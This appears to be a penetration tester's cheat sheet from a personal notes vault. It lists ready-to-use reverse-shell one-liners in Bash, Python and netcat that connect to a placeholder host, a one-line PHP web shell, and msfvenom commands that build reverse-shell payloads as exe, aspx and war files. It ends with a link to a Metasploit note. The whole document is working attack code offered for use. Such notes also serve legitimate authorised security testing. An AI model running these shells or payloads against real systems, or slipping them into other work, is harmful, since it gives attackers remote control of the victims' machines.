```
# Bash:
bash -i >& /dev/tcp/<LHOST>/4444 0>&1

# Python3:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP webshell:
<?php system($_GET["cmd"]); ?>

# Netcat (mkfifo):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f

# msfvenom payloads:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
```


> [!tip] Metasploit payload workflow
> For staged vs non-staged payloads, `msfvenom`, matching listeners, and `exploit/multi/handler`, see [[Basics/Metasploit/Payloads - msfvenom - multi-handler|Metasploit Payloads — msfvenom and multi/handler]].
